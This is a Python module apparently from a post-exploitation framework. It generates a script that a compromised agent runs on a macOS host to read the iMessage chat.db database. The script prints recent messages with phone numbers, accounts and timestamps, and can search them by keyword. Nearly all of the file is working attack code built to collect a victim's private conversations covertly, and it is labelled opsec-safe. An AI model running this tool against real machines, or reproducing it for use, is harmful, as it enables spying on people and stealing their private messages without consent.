#!/usr/bin/env python
class Module:
    def __init__(self, mainMenu, params=[]):
        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'iMessageDump',

            # list of one or more authors for the module
            'Author': ['Alex Rymdeko-Harvey', '@Killswitch-GUI'],

            # more verbose multi-line description of the module
            'Description': 'This module will enumerate the entire chat and IMessage SQL Database.',

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # Use on disk execution method, rather than a dynamic exec method
            'RunOnDisk' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                'Using SQLite3 iMessage has a decent standard to correlate users to messages and isnt encrypted.'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Messages' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'The number of messages to enumerate from most recent.',
                'Required'      :   True,
                'Value'         :   '10'
            },
            'Search' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Enable a find keyword to search for within the iMessage Database.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Debug' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Enable a find keyword to search for within the iMessage Database.',
                'Required'      :   True,
                'Value'         :   'False'
            }

        }
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        count = self.options['Messages']['Value']
        script = "count = " + str(count) + '\n'
        if self.options['Debug']['Value']:
            debug = self.options['Debug']['Value']
            script += "debug = " + str(debug) + '\n'
        if self.options['Search']['Value']:
            search = self.options['Search']['Value']
            script += 'searchPhrase = "' + str(search) + '"\n'

        script += """
try:
    if searchPhrase:
        searchMessage = True
except:
    searchMessage = False
    searchPhrase = ""
try:

    class imessage_dump():
        def __init__(self):
            try:
                print "[*] Message Enumeration Started!"
            except Exception as e:
                print e
        def func(self, count, searchMessage, debug, searchPhrase):
            try:
                import sqlite3
                from os.path import expanduser
                home = expanduser("~") + '/Library/Messages/chat.db'
                # Open the database handle for the user
                conn = sqlite3.connect(home)
                cur = conn.cursor()
                # Query Date, Text message and place it into a array
                cur.execute("SELECT date,text,service,account,ROWID FROM message;")
                # execute the data enum
                statment = cur.fetchall()
                # handle: Table links the number, country, type to the chat ID
                # SELECT * FROM handle
                # ex: (2, u'+12150000000', u'US', u'iMessage', None)
                cur.execute("SELECT ROWID,id,country,service FROM handle")
                handle = cur.fetchall()
                # chat_message_join: Links the chat ID to the Text ID (sequency number)
                # SELECT * FROM chat_message_join
                cur.execute("SELECT chat_id,message_id FROM chat_message_join")
                messageLink = cur.fetchall()
                #cur.execute("SELECT account_id,service_center,chat_identifier FROM chat")
                #GuidData = cur.fetchall()
                # Itterate over data
                dictList = []
                count = count * -1
                for item in statment[count:]:
                    try:
                        for messageid in messageLink:
                        # simple declare to prvent empty values
                            if str(messageid[1]) == str(item[4]):
                                chatid =  messageid[0]
                                for rowid in handle:
                                    if str(rowid[0]) == str(chatid):
                                        if rowid[1]:
                                            Number = str(rowid[1])
                                        if rowid[2]:
                                            Country = str(rowid[2])
                                        if rowid[3]:
                                            Type = str(rowid[3])
                        epoch = self.TimeConv(item[0], debug)
                        line = {}
                        try:
                            if item[4]:
                                line['ROWID'] = str(item[4])
                            if item[2]:
                                line['Service'] = str(item[2])
                            if item[3]:
                                line['Account'] = str(item[3])
                            if epoch:
                                line['Date'] = str(epoch)
                            if Number:
                                line['Number'] = str(Number)
                            if Country:
                                line['Country'] = str(Country)
                            if Type:
                                line['Type'] = str(Type)
                            if item[1]:
                                line['Message'] = str(self.RemoveUnicode(item[1]))
                        except Exception as e:
                            if debug:
                                print " [Debug] Issues with object creation (line 55): " + str(e)
                        dictList.append(line)
                    except Exception as e:
                        if debug:
                            print " [Debug] Isssue at object creation (line 40): " + str(e)
                        pass
                        #print e
                conn.close()
                x = 0
                for dic in dictList:
                    try:
                        if searchMessage:
                            # check for phrase in message
                            try:
                                if dic['Message']:
                                    Msg = dic['Message'].lower()
                                    if Msg.find(searchPhrase.lower()) != -1:
                                        for key in dic.keys():
                                            print " %s : %s" %(key, dic[key])
                                        x += 1
                                        print ''
                            except Exception as e:
                                if debug:
                                    print " [Debug] At Decode of Dict item for Message search (line 180): " + str(e)
                                pass
                        else:
                            for key in dic.keys():
                                try:
                                    print " %s : %s" %(key, dic[key])
                                except Exception as e:
                                    if debug:
                                        print " [Debug] At Decode of Dict item (line 180): " + str(e)
                                    pass
                            print ''
                    except Exception as e:
                        print "[!] Issue Decoding Dict Item: " + str(e)
                if searchMessage:
                    print "[!] Messages Matching Phrase: " + str(x)
                print "[!] Messages in DataStore: " + str(len(statment))
                count = count * -1
                print "[!] Messages Enumerated: " + str(count)
            except Exception as e:
                print e
            # Close the Database handle
        def TimeConv(self, epoch, debug):
            import datetime
            try:
                d = datetime.datetime.strptime("01-01-2001", "%m-%d-%Y")
                time = (d + datetime.timedelta(seconds=epoch)).strftime("%a, %d %b %Y %H:%M:%S GMT")
                return time
            except Exception as e:
                if debug:
                    print " [Debug] Issues Decoding epoch time: " + str(e)

        def RemoveUnicode(self, string):
                import re
                try:
                    string_data = string
                    if string_data is None:
                        return string_data
                    if isinstance(string_data, str):
                        string_data = str(string_data.decode('ascii', 'ignore'))
                    else:
                        string_data = string_data.encode('ascii', 'ignore')
                    remove_ctrl_chars_regex = re.compile(r'[^\x20-\x7e]')
                    CleanString = remove_ctrl_chars_regex.sub('', string_data)
                    return CleanString
                except Exception as e:
                    p = '[!] UTF8 Decoding issues Matching: ' + str(e)
                    print p
    im = imessage_dump()
    im.func(count, searchMessage, debug, searchPhrase)
except Exception as e:
    print e"""

        # add any arguments to the end exec

        return script

# handle: Table links the number, country, type to the chat ID
# SELECT * FROM handle
# chat_message_join: Links the chat ID to the Text ID (sequency number)
# SELECT * FROM chat_message_join

# INTEGER: A signed integer up to 8 bytes depending on the magnitude of the value.
# REAL: An 8-byte floating point value.
# TEXT: A text string, typically UTF-8 encoded (depending on the database encoding).
# BLOB: A blob of data (binary large object) for storing binary data.
# NULL: A NULL value, represents missing data or an empty cell.

# SQLITE3 message laylout:

# (u'table', u'message', u'message', 5, u'CREATE TABLE message (ROWID INTEGER PRIMARY KEY AUTOINCREMENT,
# guid TEXT UNIQUE NOT NULL, text TEXT, replace INTEGER DEFAULT 0, service_center TEXT, handle_id INTEGER DEFAULT 0,
# subject TEXT, country TEXT, attributedBody BLOB, version INTEGER DEFAULT 0, type INTEGER DEFAULT 0, service TEXT,
# account TEXT, account_guid TEXT, error INTEGER DEFAULT 0, date INTEGER, date_read INTEGER, date_delivered INTEGER,
# is_delivered INTEGER DEFAULT 0, is_finished INTEGER DEFAULT 0, is_emote INTEGER DEFAULT 0, is_from_me INTEGER DEFAULT 0,
# is_empty INTEGER DEFAULT 0, is_delayed INTEGER DEFAULT 0, is_auto_reply INTEGER DEFAULT 0, is_prepared INTEGER DEFAULT 0,
# is_read INTEGER DEFAULT 0, is_system_message INTEGER DEFAULT 0, is_sent INTEGER DEFAULT 0, has_dd_results INTEGER DEFAULT 0,
# is_service_message INTEGER DEFAULT 0, is_forward INTEGER DEFAULT 0, was_downgraded INTEGER DEFAULT 0, is_archive INTEGER DEFAULT 0,
# cache_has_attachments INTEGER DEFAULT 0, cache_roomnames TEXT, was_data_detected INTEGER DEFAULT 0, was_deduplicated INTEGER DEFAULT 0,
# is_audio_message INTEGER DEFAULT 0, is_played INTEGER DEFAULT 0, date_played INTEGER, item_type INTEGER DEFAULT 0,
# other_handle INTEGER DEFAULT 0, group_title TEXT, group_action_type INTEGER DEFAULT 0, share_status INTEGER DEFAULT 0,
# share_direction INTEGER DEFAULT 0, is_expirable INTEGER DEFAULT 0, expire_state INTEGER DEFAULT 0, message_action_type INTEGER DEFAULT 0,
# message_source INTEGER DEFAULT 0)')
